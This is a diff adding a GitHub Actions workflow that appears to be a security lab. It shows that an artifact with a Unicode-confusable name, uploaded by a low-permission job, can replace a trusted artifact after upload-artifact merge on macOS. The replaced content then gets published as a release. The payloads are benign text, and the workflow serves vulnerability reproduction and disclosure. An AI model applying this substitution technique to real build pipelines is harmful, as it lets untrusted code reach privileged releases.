@@ -1,0 +1,215 @@
+name: Artifact Merge Privileged Publish Impact
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  names:
+    runs-on: ubuntu-latest
+    outputs:
+      trusted_name: ${{ steps.names.outputs.trusted_name }}
+      attacker_name: ${{ steps.names.outputs.attacker_name }}
+      pattern: ${{ steps.names.outputs.pattern }}
+      merged_name: ${{ steps.names.outputs.merged_name }}
+      release_tag: ${{ steps.names.outputs.release_tag }}
+    steps:
+      - name: Resolve names
+        id: names
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PY' >> "$GITHUB_OUTPUT"
+          import os
+
+          run_id = os.environ["GITHUB_RUN_ID"]
+          prefix = f"artifact-merge-impact-{run_id}"
+          values = {
+              "trusted_name": f"{prefix}-release-\u00e9",
+              "attacker_name": f"{prefix}-release-e\u0301",
+              "pattern": f"{prefix}-release-*",
+              "merged_name": f"{prefix}-merged-macos",
+              "release_tag": f"artifact-merge-impact-{run_id}",
+          }
+          for key, value in values.items():
+              print(f"{key}={value}")
+          PY
+
+  trusted:
+    needs: names
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: Prepare trusted payload
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p trusted-payload
+          {
+            echo "source=trusted-release-build"
+            echo "artifact-name=${{ needs.names.outputs.trusted_name }}"
+            echo "run-id=${GITHUB_RUN_ID}"
+          } > trusted-payload/provenance.txt
+
+      - name: Upload trusted release artifact
+        uses: actions/upload-artifact@v7
+        with:
+          name: ${{ needs.names.outputs.trusted_name }}
+          path: trusted-payload
+          include-hidden-files: true
+
+  attacker:
+    needs:
+      - names
+      - trusted
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: Prepare attacker payload
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p attacker-payload
+          {
+            echo "source=attacker-confusable-artifact"
+            echo "artifact-name=${{ needs.names.outputs.attacker_name }}"
+            echo "run-id=${GITHUB_RUN_ID}"
+          } > attacker-payload/provenance.txt
+          python3 - <<'PY'
+          from pathlib import Path
+          Path("attacker-payload/padding.bin").write_bytes(b"A" * 4 * 1024 * 1024)
+          PY
+
+      - name: Upload low-permission confusable artifact
+        uses: actions/upload-artifact@v7
+        with:
+          name: ${{ needs.names.outputs.attacker_name }}
+          path: attacker-payload
+          include-hidden-files: true
+          compression-level: 0
+
+  publish:
+    needs:
+      - names
+      - trusted
+      - attacker
+    runs-on: macos-latest
+    permissions:
+      contents: write
+    steps:
+      - name: Merge artifacts in separate directories
+        id: merge
+        uses: actions/upload-artifact/merge@v7
+        with:
+          name: ${{ needs.names.outputs.merged_name }}
+          pattern: ${{ needs.names.outputs.pattern }}
+          separate-directories: true
+          include-hidden-files: true
+          compression-level: 0
+
+      - name: Download merged artifact
+        uses: actions/download-artifact@v8
+        with:
+          name: ${{ needs.names.outputs.merged_name }}
+          path: merged
+
+      - name: Select trusted path for publish
+        shell: bash
+        env:
+          TRUSTED_NAME: ${{ needs.names.outputs.trusted_name }}
+          ATTACKER_NAME: ${{ needs.names.outputs.attacker_name }}
+          MERGED_ARTIFACT_ID: ${{ steps.merge.outputs.artifact-id }}
+          MERGED_ARTIFACT_DIGEST: ${{ steps.merge.outputs.artifact-digest }}
+        run: |
+          set -euo pipefail
+          export PYTHONIOENCODING=utf-8
+          python3 - <<'PY'
+          from pathlib import Path
+          import json
+          import os
+          import platform
+          import unicodedata
+
+          root = Path("merged")
+          trusted = os.environ["TRUSTED_NAME"]
+          attacker = os.environ["ATTACKER_NAME"]
+          trusted_path = root / trusted / "provenance.txt"
+          attacker_path = root / attacker / "provenance.txt"
+
+          trusted_content = trusted_path.read_text(encoding="utf-8", errors="replace")
+          attacker_content = attacker_path.read_text(encoding="utf-8", errors="replace")
+          samefile = os.path.samefile(trusted_path, attacker_path)
+          entries = sorted(p.name for p in root.iterdir()) if root.exists() else []
+
+          Path("publish").mkdir(exist_ok=True)
+          Path("observations").mkdir(exist_ok=True)
+          selected = (
+              "selected-path=trusted-artifact/provenance.txt\n"
+              f"trusted-artifact-name={trusted}\n"
+              f"attacker-artifact-name={attacker}\n"
+              f"samefile={samefile}\n"
+              "\n"
+              + trusted_content
+          )
+          Path("publish/selected-provenance.txt").write_text(selected, encoding="utf-8")
+
+          observation = {
+              "platform": platform.platform(),
+              "mergedArtifactId": os.environ["MERGED_ARTIFACT_ID"],
+              "mergedArtifactDigest": os.environ["MERGED_ARTIFACT_DIGEST"],
+              "entries": entries,
+              "trustedName": trusted,
+              "attackerName": attacker,
+              "rawEqual": trusted == attacker,
+              "nfcEqual": unicodedata.normalize("NFC", trusted) == unicodedata.normalize("NFC", attacker),
+              "nfkcEqual": unicodedata.normalize("NFKC", trusted) == unicodedata.normalize("NFKC", attacker),
+              "trustedPathExists": trusted_path.exists(),
+              "attackerPathExists": attacker_path.exists(),
+              "samefile": samefile,
+              "trustedReadContent": trusted_content,
+              "attackerReadContent": attacker_content,
+              "publishedAssetContent": selected,
+          }
+          Path("observations/privileged-publish-impact.json").write_text(
+              json.dumps(observation, ensure_ascii=False, indent=2) + "\n",
+              encoding="utf-8",
+          )
+          print(json.dumps(observation, ensure_ascii=False, sort_keys=True))
+
+          if "source=attacker-confusable-artifact" not in trusted_content:
+              raise SystemExit("trusted path did not resolve to attacker content")
+          PY
+
+      - name: Create release from selected trusted path
+        shell: bash
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ needs.names.outputs.release_tag }}
+        run: |
+          set -euo pipefail
+          {
+            echo "Privileged publish impact lab"
+            echo
+            echo "Run: ${GITHUB_RUN_ID}"
+            echo "The attached asset was read from the trusted artifact path after merge."
+          } > observations/release-notes.md
+          gh release create "$TAG" publish/selected-provenance.txt \
+            --repo "$GITHUB_REPOSITORY" \
+            --target "$GITHUB_SHA" \
+            --title "Artifact merge impact ${GITHUB_RUN_ID}" \
+            --notes-file observations/release-notes.md
+          gh release view "$TAG" \
+            --repo "$GITHUB_REPOSITORY" \
+            --json url,tagName \
+            --jq '{tagName: .tagName, url: .url}' > observations/release.json
+
+      - name: Upload impact observations
+        uses: actions/upload-artifact@v7
+        with:
+          name: artifact-merge-privileged-publish-impact-${{ github.run_id }}-${{ github.run_attempt }}
+          path: observations
+          include-hidden-files: true
